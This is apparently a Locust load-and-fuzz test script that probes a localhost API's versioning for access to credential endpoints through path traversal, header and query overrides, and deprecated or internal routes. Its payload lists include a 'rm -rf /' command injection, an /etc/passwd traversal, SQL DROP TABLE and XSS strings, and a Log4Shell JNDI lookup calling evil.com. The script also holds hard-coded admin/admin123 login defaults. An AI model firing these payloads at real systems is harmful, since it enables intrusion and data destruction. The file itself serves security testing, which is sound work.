import json
import logging
from locust import HttpUser, task, SequentialTaskSet, constant

log = logging.getLogger(__name__)

class APIVersioningFuzz(SequentialTaskSet):

    def on_start(self):
        """Get authentication token"""
        payload = {"username": "admin", "password": "admin123"}
        response = self.client.post("/api/v3/login", json=payload, verify=False, catch_response=True)
        self.token = "fake_token" if response.status_code != 200 else response.json()["access_token"]

    @task
    def fuzz_version_enumeration(self):
        """Test API version enumeration"""
        headers = {"Authorization": f"Bearer {self.token}"}

        # Test different API versions
        api_versions = [
            "v1", "v2", "v3", "v4", "v5",
            "v1.0", "v1.1", "v2.0", "v2.1", "v3.0", "v3.1",
            "beta", "alpha", "dev", "test",
            "latest", "current", "stable",
            "admin", "internal", "debug",
            "v0", "v99", "v100",
            "version1", "version2",
            "api1", "api2",
        ]

        for version in api_versions:
            endpoints_to_test = [
                f"/api/{version}/raw-credentials",
                f"/api/{version}/credentials",
                f"/api/{version}/users",
                f"/api/{version}/admin",
                f"/api/{version}/config",
                f"/api/{version}/status",
                f"/api/{version}/health",
            ]

            for endpoint in endpoints_to_test:
                with self.client.get(endpoint,
                                     headers=headers,
                                     verify=False,
                                     catch_response=True) as response:

                    if response.status_code == 200:
                        log.warning(f"Version enumeration successful: {endpoint}")
                        response.success()
                    elif response.status_code in [404, 405]:
                        response.success()
                        log.info(f"Version not found: {endpoint}")
                    elif response.status_code == 401:
                        log.info(f"Auth required for: {endpoint}")
                        response.success()
                    else:
                        response.success()

    @task
    def fuzz_version_path_manipulation(self):
        """Test version path manipulation attacks"""
        headers = {"Authorization": f"Bearer {self.token}"}

        # Path manipulation in version parameter
        version_manipulations = [
            "../v2",
            "..\\v2",
            "v3/../v1",
            "v3/../../etc/passwd",
            "v3%2F..%2Fv1",
            "v3/./v2",
            "v3;rm -rf /",
            "v3'; DROP TABLE versions; --",
            "v3<script>alert('xss')</script>",
            "v3${jndi:ldap://evil.com/exploit}",
            "v3/../admin",
            "v3/../../root",
        ]

        for manipulation in version_manipulations:
            endpoint = f"/api/{manipulation}/raw-credentials"

            with self.client.get(endpoint,
                                 headers=headers,
                                 verify=False,
                                 catch_response=True) as response:

                if response.status_code == 200:
                    log.warning(f"Version manipulation successful: {endpoint}")
                    response.success()
                elif response.status_code in [400, 404]:
                    response.success()
                    log.info(f"Version manipulation blocked: {endpoint}")
                else:
                    response.success()

    @task
    def fuzz_version_header_injection(self):
        """Test API version specification via headers"""
        base_headers = {"Authorization": f"Bearer {self.token}"}

        # Version specification via headers
        version_headers = [
            {"API-Version": "v1"},
            {"API-Version": "v2"},
            {"Accept-Version": "v1"},
            {"X-API-Version": "admin"},
            {"Version": "internal"},
            {"X-Version": "debug"},
            {"API-Version": "'; DROP TABLE versions; --"},
            {"API-Version": "../admin"},
            {"Accept": "application/vnd.api+json;version=1"},
            {"Accept": "application/vnd.api+json;version=admin"},
        ]

        for version_header in version_headers:
            headers = {**base_headers, **version_header}

            with self.client.get("/api/v3/raw-credentials",
                                 headers=headers,
                                 verify=False,
                                 catch_response=True) as response:

                if response.status_code == 200:
                    log.info(f"Version header accepted: {version_header}")
                    response.success()
                elif response.status_code in [400, 406]:  # 406 = Not Acceptable
                    response.success()
                else:
                    response.success()

    @task
    def fuzz_deprecated_endpoints(self):
        """Test access to deprecated or legacy endpoints"""
        headers = {"Authorization": f"Bearer {self.token}"}

        # Common deprecated endpoint patterns
        deprecated_patterns = [
            "/api/v1/credentials",
            "/api/v2/credentials",
            "/api/legacy/credentials",
            "/api/old/credentials",
            "/api/deprecated/credentials",
            "/credentials",  # No version prefix
            "/v1/credentials",  # No /api prefix
            "/rest/v1/credentials",
            "/webapi/v1/credentials",
            "/services/v1/credentials",
        ]

        for pattern in deprecated_patterns:
            with self.client.get(pattern,
                                 headers=headers,
                                 verify=False,
                                 catch_response=True) as response:

                if response.status_code == 200:
                    log.warning(f"Deprecated endpoint accessible: {pattern}")
                    response.success()
                elif response.status_code in [404, 410]:  # 410 = Gone
                    response.success()
                    log.info(f"Deprecated endpoint properly disabled: {pattern}")
                else:
                    response.success()

    @task
    def fuzz_version_downgrade_attacks(self):
        """Test version downgrade attacks"""
        headers = {"Authorization": f"Bearer {self.token}"}

        # Try to access older versions that might have vulnerabilities
        credential_data = {
            "name": "version_test",
            "username": "testuser",
            "password": "testpass",
            "type": "OS"
        }

        older_versions = ["v1", "v2", "v0", "beta", "alpha"]

        for version in older_versions:
            endpoint = f"/api/{version}/raw-credentials"

            # Try GET
            with self.client.get(endpoint,
                                 headers=headers,
                                 verify=False,
                                 catch_response=True) as response:

                if response.status_code == 200:
                    log.warning(f"Older version accessible for GET: {endpoint}")
                    response.success()
                elif response.status_code == 404:
                    response.success()
                else:
                    response.success()

            # Try POST
            with self.client.post(endpoint,
                                  headers=headers,
                                  json=credential_data,
                                  verify=False,
                                  catch_response=True) as response:

                if response.status_code in [200, 201]:
                    log.warning(f"Older version accessible for POST: {endpoint}")
                    response.success()
                elif response.status_code == 404:
                    response.success()
                else:
                    response.success()

    @task
    def fuzz_version_bypass_techniques(self):
        """Test version bypass techniques"""
        headers = {"Authorization": f"Bearer {self.token}"}

        # Various bypass techniques
        bypass_techniques = [
            # Query parameter version override
            {"endpoint": "/api/v3/raw-credentials", "params": {"version": "v1"}},
            {"endpoint": "/api/v3/raw-credentials", "params": {"api_version": "v2"}},
            {"endpoint": "/api/v3/raw-credentials", "params": {"v": "admin"}},

            # Multiple version specifications
            {"endpoint": "/api/v3/raw-credentials", "params": {"version": "v1"}, "headers": {"API-Version": "v2"}},
        ]

        for technique in bypass_techniques:
            endpoint = technique["endpoint"]
            params = technique.get("params", {})
            extra_headers = technique.get("headers", {})
            test_headers = {**headers, **extra_headers}

            with self.client.get(endpoint,
                                 headers=test_headers,
                                 params=params,
                                 verify=False,
                                 catch_response=True) as response:

                if response.status_code == 200:
                    log.info(f"Version bypass technique worked: {technique}")
                    response.success()
                else:
                    response.success()

    @task
    def fuzz_internal_version_endpoints(self):
        """Test access to internal version endpoints"""
        headers = {"Authorization": f"Bearer {self.token}"}

        # Internal/admin version endpoints
        internal_endpoints = [
            "/api/internal/credentials",
            "/api/admin/credentials",
            "/api/debug/credentials",
            "/api/test/credentials",
            "/api/dev/credentials",
            "/api/staging/credentials",
            "/api/private/credentials",
            "/api/system/credentials",
            "/api/management/credentials",
            "/api/control/credentials",
        ]

        for endpoint in internal_endpoints:
            with self.client.get(endpoint,
                                 headers=headers,
                                 verify=False,
                                 catch_response=True) as response:

                if response.status_code == 200:
                    log.warning(f"Internal endpoint accessible: {endpoint}")
                    response.success()
                elif response.status_code == 403:
                    log.info(f"Internal endpoint properly protected: {endpoint}")
                    response.success()
                elif response.status_code == 404:
                    response.success()
                else:
                    response.success()

class APIVersioningUser(HttpUser):
    wait_time = constant(1)
    tasks = [APIVersioningFuzz]
    host = "https://localhost:8443"
